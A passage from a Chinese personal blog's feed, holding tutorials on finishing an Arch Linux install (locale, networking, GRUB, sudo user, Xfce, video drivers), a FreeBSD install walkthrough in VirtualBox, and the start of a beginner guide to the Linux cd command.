<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/locale.gen
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行 <code>locale-gen</code> 生成 locale 讯息:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># locale-gen
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 <code>/etc/</code> 目录下创建 一个叫 <code>locale.conf</code> 的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/locale.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">LANG</span><span class="o">=</span><span class="s">en_US.UTF-8</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="网络">网络</h4>
<p>首先需要安装的是 <code>networkmanager</code> 这个包，不然安装完成重启后就需要手动配置网络了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacman -S networkmanager
</span></span></code></pre></td></tr></table>
</div>
</div><p>启用 NetworkManager 服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># systemctl enable NetworkManager
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来创建一个 <code>hostname</code> 文件，这个文件存储你的主机名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/hostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容，随便写，<strong>但是要记住</strong>，这里以 <code>myhostname</code> 代替了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">myhostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来编辑 <code>/etc/hosts</code> 这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>写入以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">127.0.0.1	localhost
</span></span><span class="line"><span class="cl">::1		localhost
</span></span><span class="line"><span class="cl">127.0.1.1	myhostname.localdomain	myhostname
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># systemctl enable dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在安装完成之后就不需要担心网络连接问题了</p>
<h4 id="root-密码">Root 密码</h4>
<p>你需要设置一个 root 密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样基本系统就差不多完成了，但是现在还不能重启，因为它目前无法被引导。</p>
<h3 id="安装启动引导器">安装启动引导器</h3>
<p>如上面所说，你需要一个启动引导程序才能启动系统，Linux 有很多类似于这样的软件，可以在<a href="https://wiki.archlinux.org/index.php/Boot_loaders_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">这个页面</a>参考.</p>
<p>我推荐使用 <code>GRUB</code></p>
<h4 id="安装grub">安装Grub</h4>
<p>先安装 <code>grub</code> 这个软件包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacman -S grub
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里要考虑到两种情况了,</p>
<p><strong>第一种情况: BIOS + MBR</strong></p>
<p>直接执行这条即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-install --target=i386-pc /dev/sdX
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果它返回出 <code>no erros</code> 之类的,那么就可以执行下面的了.</p>
<p>生成 grub 配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来就可以拔掉 U 盘重启了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># reboot
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>第二种情况: UEFI  + GPT</strong>
这种情况的比较复杂一些,</p>
<p>首先挂载你的EFI分区</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mount /dev/sdX1 /boot/EFI 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-install --target=x86_64-efi --efi-directory=/boot/EFI/ --bootloader-id=GRUB
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后还是一样的生成配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来就可以拔掉 U 盘重启了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># reboot
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="安装后工作">安装后工作</h2>
<p>装完后要做的一些事情.</p>
<h3 id="创建普通用户">创建普通用户</h3>
<p>装完以后, 不建议直接使用 root 用户,需要创建一个普通用户</p>
<p>先使用 root 用户登录,执行这条命令创建一个普通用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># useradd -G wheel -m -s /bin/bash &lt;用户名&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来给你的用户设置密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># passwd &lt;用户名&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>将其添加到 <code>sudoers</code> 列表, 如果你没有安装 <code>sudo</code> 或 <code>base-devel</code> 请先执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># sudo pacman -S sudo
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后编辑 <code>/etc/sudoers</code> 这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># vim /etc/sudoers
</span></span></code></pre></td></tr></table>
</div>
</div><p>将你的用户名添加到 <code>root</code> 的下面,照抄即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># Defaults!/usr/bin/sudoreplay !log_output
</span></span><span class="line"><span class="cl"># Defaults!/usr/local/bin/sudoreplay !log_output
</span></span><span class="line"><span class="cl"># Defaults!REBOOT !log_output
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">## Runas alias specification
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">## User privilege specification
</span></span><span class="line"><span class="cl">##
</span></span><span class="line"><span class="cl">root ALL=(ALL) ALL
</span></span><span class="line"><span class="cl">&lt;用户名&gt; ALL=(ALL) ALL
</span></span></code></pre></td></tr></table>
</div>
</div><p>重启即可登录普通用户了.</p>
<h3 id="安装图形界面">安装图形界面</h3>
<p>在安装图形界面之前,我们需要安装的是 xorg , 它是大多数图形界面的依赖&hellip;</p>
<p>算了,这么一大堆说完肯定&hellip;.直接一套安排上吧(xfce)</p>
<p>安装软件包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xorg xfce4 lightdm lightdm-greeter-gtk
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置lightdm启动权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo systemctl enable lightdm
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装显卡驱动">安装显卡驱动</h3>
<p>显卡驱动软件包列表.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">extra/xf86-video-amdgpu 19.1.0-2 (xorg-drivers) 
</span></span><span class="line"><span class="cl">    X.org amdgpu video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-ati 1:19.1.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org ati video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-dummy 0.3.8-4 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org dummy video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-fbdev 0.5.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org framebuffer video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-intel 1:2.99.917+908+g7181c5a4-1 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org Intel i810/i830/i915/945G/G965+ video drivers
</span></span><span class="line"><span class="cl">extra/xf86-video-nouveau 1.0.16-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    Open Source 3D acceleration driver for nVidia cards
</span></span><span class="line"><span class="cl">extra/xf86-video-openchrome 0.6.0-4 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.Org Openchrome drivers
</span></span><span class="line"><span class="cl">extra/xf86-video-sisusb 0.9.7-3
</span></span><span class="line"><span class="cl">    X.org SiS USB video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-vesa 2.4.0-3 (xorg-drivers xorg) 
</span></span><span class="line"><span class="cl">    X.org vesa video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-vmware 13.3.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org vmware video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-voodoo 1.2.5-11 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org 3dfx Voodoo1/Voodoo2 2D video driver
</span></span><span class="line"><span class="cl">community/xf86-video-qxl 0.1.5-7 (xorg-drivers)
</span></span><span class="line"><span class="cl">    Xorg X11 qxl video driver
</span></span></code></pre></td></tr></table>
</div>
</div><p>vesa 会自动装上, 自己是什么显卡就装什么, 不需要过多解释了吧&hellip;</p>
<p>Intel 核显</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-intel
</span></span></code></pre></td></tr></table>
</div>
</div><p>NVIDIA</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-nouveau
</span></span></code></pre></td></tr></table>
</div>
</div><p>AMD</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-amdgpu
</span></span></code></pre></td></tr></table>
</div>
</div><p>好啦 装完啦~</p>
<p>接下来系统就可以使用啦~</p>
]]></description>
</item><item>
    <title>FreeBSD 初♂体验</title>
    <link>http://weepingdogel.github.io/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/</link>
    <pubDate>Mon, 30 Mar 2020 15:49:34 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-r2pdxw.png" referrerpolicy="no-referrer">
            </div><h2 id="开场白">开场白</h2>
<p>闲着无聊我又来<del>水文章</del>更新了，这次准备<del>水</del>写一篇比较长的，然后就想对FreeBSD下手了,嘿嘿。</p>
<h2 id="freebsd介绍">FreeBSD介绍</h2>
<p>FreeBSD是一个类Unix的操作系统，它与Linux还是有区别的&hellip;&hellip;</p>
<p>Unix&hellip;感觉很少人用吧..估计比Linux还少，不过服务器用用应该还不错吧&hellip;</p>
<p>维基百科是这么说的 :</p>
<blockquote>
<p>FreeBSD是一个类Unix的操作系统，也是FreeBSD项目的发展成果。[2]FreeBSD是第一个开放源代码的系统，他是由基于BSD Unix的源代码派生而来的。BSD Unix是加州大学伯克利分校在1975年至1993年开发的操作系统。FreeBSD被开发为自由软件，这意味着其源代码开放，人人都可以使用FreeBSD。任何人都可以获得并使用它来满足各种需求，也可以修改它，然后再重发布它。此功能专为个人和公司量身定制，可用于创建各种基于FreeBSD的商业和非商业产品。尽管FreeBSD直接从BSD派生，但是从法律的角度来看，FreeBSD为 unix 系统，但它并不是“UNIX”。因为现在“UNIX”商标是属于国际开放标准组织的。[3]FreeBSD的第一个版本于1993年发布。</p>
</blockquote>
<blockquote>
<p>FreeBSD是一个支持许多硬件和体系架构的企业级系统。和其他BSD家族的操作系统一样， FreeBSD其核心、驱动程序以及所有的用户层（Userland）应用程序（如Unix shell和cat和ps等命令）都存储在源代码库中。[4]FreeBSD也可以运行其他二进制软件，比如Linux的。借助ports和FreeBSD软件包管理器，你可以在其上安装各种应用程序。根据2005年的调查，77％的BSD用户使用FreeBSD，因此FreeBSD拥有BSD系列中最大的用户社区。[5]</p>
</blockquote>
<blockquote>
<p>在今天，个人和企业都将FreeBSD用于多种用途，包括Yahoo! [6]，苹果[7]，Juniper网络公司，诺基亚，IBM， Yandex的，Apache软件基金会，Hotmail，索尼和许多其他用途</p>
<p><a href="https://zh.wikipedia.org/wiki/FreeBSD" target="_blank" rel="noopener noreffer">[Read More]</a></p>
</blockquote>
<h2 id="安装">安装</h2>
<h3 id="准备工作">准备工作</h3>
<p>我打算在虚拟机里玩玩就好啦～</p>
<blockquote>
<p>问:是VirtualBox吗？</p>
</blockquote>
<p>对，之前介绍过的<strong>VirtualBox</strong>，也应该没什么好讲的了，创建一个虚拟机应该不是问题，问题是接下来如何进行安装。</p>
<p>除了虚拟机我们还要准备的东西就是FreeBSD的安装镜像了，可以去官方的源下载，但是考虑到速度问题，也可以去墙内的一些镜像站下载。</p>
<p><a href="http://mirrors.ustc.edu.cn/freebsd/releases/" target="_blank" rel="noopener noreffer">USTC Mirror</a></p>
<p><strong>注意：下载的时候要确定你的架构，别下错了</strong>(应该大部分都是amd64吧)</p>
<p>什么？你说配置要求？嘛&hellip;</p>
<p>看看官网怎么说</p>
<blockquote>
<p>FreeBSD/i386 和 FreeBSD/pc98 版本， 都需要 486 或更高的处理器，以及至少 24 MB 的 RAM。 您需要至少 150 MB 的空闲硬盘空间， 才能完成最小的安装配置。</p>
</blockquote>
<p>至于amd64架构嘛，一句话，你有处理器有内存有硬盘就能用，而且我们都用虚拟机了</p>
<h3 id="安装过程">安装过程</h3>
<p>首先肯定是先把镜像导入虚拟机啦，这个我就不再写一遍了，百度谷歌能搜到的&hellip;</p>
<p>然后我们启动，就会看到这个可爱的画面..</p>
<p>你可以直接按回车，也可以等10秒让它自动启动&hellip;</p>
<p></p>
<p>启动之后就会来到这个界面</p>
<p></p>
<p>选择Install按回车啦</p>
<p>然后是选择键盘类型，这里选<code>United States Of America</code>
</p>
<p>选完以后回到第一项回车即可，当然你也可以在第二项那里测试你的键盘是否有效</p>
<p></p>
<p>什么？你看不懂英文？</p>
<p>第一项是<code>继续</code></p>
<p>第二项是<code>测试键盘</code></p>
<p>下面的就是地区或者国家名称了</p>
<p>接下来输入你的主机名</p>
<p></p>
<p>我就随便输入一个<code>localhost</code>吧</p>
<p>然后回车</p>
<p>然后我就懵逼了。。</p>
<p></p>
<p>然后看了下英文手册，这里是选择要安装的组件</p>
<p>根据官方的指引，这里来翻译一下&hellip;</p>
<ul>
<li>base-dbg</li>
</ul>
<blockquote>
<p>一些基础的软件包,比如&rsquo;cat&rsquo;这样的（debugging）</p>
</blockquote>
<ul>
<li>kernel-dbg</li>
</ul>
<blockquote>
<p>内核和内核模块（debugging）</p>
</blockquote>
<ul>
<li>lib32-dbg</li>
</ul>
<blockquote>
<p>32位的依赖吧好像是，带（debugging）的</p>
</blockquote>
<ul>
<li>lib32</li>
</ul>
<blockquote>
<p>同上，但是不带（debugging）</p>
</blockquote>
<ul>
<li>ports</li>
</ul>
<blockquote>
<p>嗯..类似于Gentoo的portage，必须装</p>
</blockquote>
<ul>
<li>src</li>
</ul>
<blockquote>
<p>一些源代码，最好选上吧</p>
</blockquote>
<ul>
<li>tests</li>
</ul>
<blockquote>
<p>一些测试代码，没必要选了</p>
</blockquote>
<p>想了一会儿，然后决定这样选了，你问凭什么这样选，我凭经验</p>
<p>那你就应该凭借翻译软件把官方的手册翻译完看一遍了</p>
<p></p>
<p>接下来是分区</p>
<p></p>
<p>这里有四种方式啊&hellip;</p>
<ul>
<li>Auto(UFS)</li>
</ul>
<blockquote>
<p>以<code>UFS</code>文件系统自动进行分区</p>
</blockquote>
<ul>
<li>Manual</li>
</ul>
<blockquote>
<p>手动对硬盘进行分区</p>
</blockquote>
<ul>
<li>shell</li>
</ul>
<blockquote>
<p>使用命令对硬盘进行分区</p>
</blockquote>
<ul>
<li>Auto(ZFS)</li>
</ul>
<blockquote>
<p>用<code>ZFS</code>文件系统自动分区</p>
</blockquote>
<p>行吧，选第二项，手动</p>
<p>然后就进了这里</p>
<p></p>
<p>然后，选<code>create</code>创建一个分区表，官方手册有说明要创建一个<code>GPT</code>分区表，但这里由于我没有开启<code>EFI</code>所以我用<code>MBR</code></p>
<p></p>
<p>这里的图形操作会有提示的，看不懂英文的可以用翻译器看一下</p>
<p>什么？还是不会？这玩意跟cfdisk差不多的</p>
<p>总之详细过程我就不截图出来了，只需要把分区分成这样就行</p>
<p></p>
<p>接下来选择<code>Finish</code>,再选择<code>Commit</code></p>
<p></p>
<p>然后就会慢慢安装了</p>
<p></p>
<p>接下来就需要设置一个密码了，毕竟Unix的系统是不能空口令登录的</p>
<p></p>
<p>跟Linux一样，设置一个能记住的就可以了，然后会让你确认网卡</p>
<p></p>
<p>后面一路选<code>yes</code>，不多说</p>
<p></p>
<p>这里直接全选</p>
<p></p>
<p>然后回车，这里把<code>6</code>勾选上，继续按回车</p>
<p></p>
<p>最后一个提示，<code>yes</code>，然后回车</p>
<p>然后重启，自动启动，再登录root，就完成啦</p>
<p></p>
<h2 id="装完后的感想">装完后的感想</h2>
<p>FreeBSD注定是适合服务器的，或许也适合拿来玩，但日常使用的话就会出现很多问题让人头疼</p>
<p>反正我是不会玩啦..连个顺手的文本编辑器都没有&hellip;vi我是真用不来&hellip;要修改很多配置文件的说..</p>
<p>如果你有什么主意的话，就在下面留言吧</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/using-bsdinstall.html" target="_blank" rel="noopener noreffer">FreeBSD 使用手册（英文）</a></p>
</li>
<li>
<p><a href="https://www.freebsd.org/" target="_blank" rel="noopener noreffer">FreeBSD 官网</a></p>
</li>
</ul>
]]></description>
</item><item>
    <title>Linux 基础命令</title>
    <link>http://weepingdogel.github.io/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</link>
    <pubDate>Mon, 05 Aug 2019 15:05:06 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/linux-arm.png" referrerpolicy="no-referrer">
            </div><p><em><strong>提示：面向萌新，大佬勿喷</strong></em></p>
<p>刚入门Linux难免会觉得很麻烦，因为不知道如何使用命令去操作，这样的话在Linux系统是寸步难行的，但是学会了一些基础命令以后就能无压力的操作了，想不想学会Linux？那就让我们从简单的文件操作开始吧。</p>
<h2 id="如何使用命令行">如何使用命令行</h2>
<p>如果你的发行版自带图形界面的话，可以从图形界面的菜单中找到一个叫 <strong>“终端”</strong> 的东西，打开它，就可以使用命令了。如果你的发行版不带图形界面，那么在tty登录用户以后就可以直接使用了。</p>
<p>注意，这个终端不等于<strong>DOS</strong>也不等于<strong>cmd</strong>，它和windows是没有办毛钱关系的，是另一种东西。</p>
<h2 id="cd命令">cd命令</h2>
<p>如果你之前用过DOS或者经常使用windows的cmd，你就会知道这个命令了，这个命令在大多数操作系统中都有。</p>
<p>cd命令是”change directory”的缩写，也就是改变你当前所在的目录，后面可以加相对路径，也可以加上绝对路径。</p>
<p>简单的理解，就是进入一个文件夹。</p>
<h3 id="用法">用法</h3>
<p>测试目录:<code>/a/b/c</code></p>
<h4 id="进入某个目录">进入某个目录:</h4>
<p>绝对路径：指定一个完整的路径，与自己当前所在的目录无关</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ <span class="nb">cd</span> /a/b/c <span class="c1"># 进入/a/b/c这个路径中的目录c</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>相对路径：指定当前目录上级目录下的其他目录或下级中的一个目录 指定下一级(常用)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$ <span class="nb">cd</span> ./c <span class="c1"># 进入当前所在/a/b目录下面的目录c</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>指定上一级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$ <span class="nb">cd</span> ../xxx <span class="c1">#进入当前所在目录/a/b中的/a目录下的其他目录</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost xxx<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="退出某个目录">退出某个目录:</h4>
<p>有人可能不知道，进入了目录以后怎么退出来，那么这个时候就要用到cd ..命令了。</p>
<p>返回上一级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> .. <span class="c1"># 从当前所在的目录/a/b/c返回上一级的目录/a/b</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>返回上两级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
